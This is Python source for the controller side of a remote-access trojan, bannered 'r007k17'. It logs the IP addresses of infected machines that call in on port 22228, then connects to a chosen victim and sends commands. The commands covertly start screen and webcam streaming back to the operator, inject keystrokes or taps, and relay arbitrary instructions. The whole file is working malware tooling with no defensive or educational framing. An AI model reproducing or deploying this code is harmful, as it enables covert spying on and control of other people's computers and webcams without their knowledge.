import socket
import os, re
from vidstream import StreamingServer
import threading

def stopSpaceError(data):
    data = " ".join(re.split(r"\s+", (re.sub(r"^\s+|\s+$", "", data))))
    return data

print("###################################")
print("##### r007k17 by 7r1574n n13l #####")
print("###################################")

def command(commandToExecute):
    commandToExecute = stopSpaceError(commandToExecute)
    commandToExecuteList = commandToExecute.split()
    global ipToConnect
    if commandToExecuteList[0] in ("connect", "connexion", "connecter", "co"):
        if len(commandToExecuteList) > 1 and ("".join(commandToExecuteList[1].split("."))).isdigit() == True:
            return commandToExecuteList[1]
        else:
            print("[ERROR]: no ip requested")
            command(input(">"))
    elif commandToExecute in ("getIp", "Ipget", "getip", "ipget"):
        getIp()
    elif commandToExecute in ("listIp", "Iplist", "iplist", "listip"):
        listIp()
        command(input(">"))
    elif commandToExecute in ("stop"):
        global progrun
        progrun = False
    else:
        print("Error")
        command(input(">"))

def sendData(data):
        global run
        datalist = data.split()
        if data in ("die", "kill"):
            client.send("die".encode())
            run = False
        elif data in ("left", "quit"):
            camera.stop_server()
            screen.stop_server()
            client.send("left".encode())
            run = False
        elif data in ("screenStart", "screenstart", "screenRun", "sreenrun", "Startscreen", "startscreen", "Runscreen", "runscreen"):
            client.send("screen".encode())
        elif data in ("screenStop", "screenstop", "Stopscreen", "stopscreen"):
            screenStop()
        elif data in ("cameraStart", "camerastart", "cameraRun", "camerarun", "camStart", "camstart", "camRun", "camrun", "Startcamera", "startcamera", "Runcamera", "runcamera", "Startcam", "startcam", "Runcam", "runcam"):
            client.send("camera".encode())
        elif data in ("cameraStop", "camerastop", "camStop", "camstop", "Stopcamera", "stopcamera", "Stopcam", "stopcam"):
            cameraStop()
        elif datalist[0] in ("fasttap", "fastTap", "tapfast", "tapFast"):
            datalist.pop(0)
            data = "fast "+" ".join(datalist)
            client.send(data.encode())
        else:
            client.send(data.encode())

def getIp():
    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverSocket.bind((ipHost, 22228))
    serverSocket.listen()
    (clientConnected, clientAddress) = serverSocket.accept()
    print("Connection acquired from %s:%s" % (clientAddress[0], clientAddress[1]))
    serverSocket.close()
    addIp(clientAddress[0])
    command(input(">"))


def addIp(ipToAdd):
    f = open("ListIp.txt", "a")
    f.write(ipToAdd + "\n")
    f.close()


def listIp():
    f = open("ListIp.txt", "r")
    lines = f.readlines()
    for line in lines:
        print(line)
    f.close()
    command(input(">"))


def screenStop():
    global screen
    screen.stop_server()
    screen = StreamingServer(ipHost, 22224)
    t = threading.Thread(target=screen.start_server)
    t.start()
    
def cameraStop():
    global camera
    camera.stop_server()
    camera = StreamingServer(ipHost, 22225)
    t = threading.Thread(target=camera.start_server)
    t.start()

def creatClient():
    global screen, camera, client
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.settimeout(5)
    try:
        client.connect((ip, port))
    except:
        run = False
        try:
            print("can't connect to "+ip)
        except:
            print("ip isn't allowed")
    screen = StreamingServer(ipHost, 22224)
    t = threading.Thread(target=screen.start_server)
    t.start()
    camera = StreamingServer(ipHost, 22225)
    t = threading.Thread(target=camera.start_server)
    t.start()
    
ipToConnect = str()
ipHost = "172.17.1.214"
port = 22228

progrun = True

while progrun == True:
    ip = command(input(">"))
    run = True
    if progrun == True:
        creatClient()
    
    while run == True and progrun == True:
        dataToSend = input("%s>" % (ip))
        sendData(dataToSend)
    camera.stop_server()
    screen.stop_server()
print("prog stop")
exit()
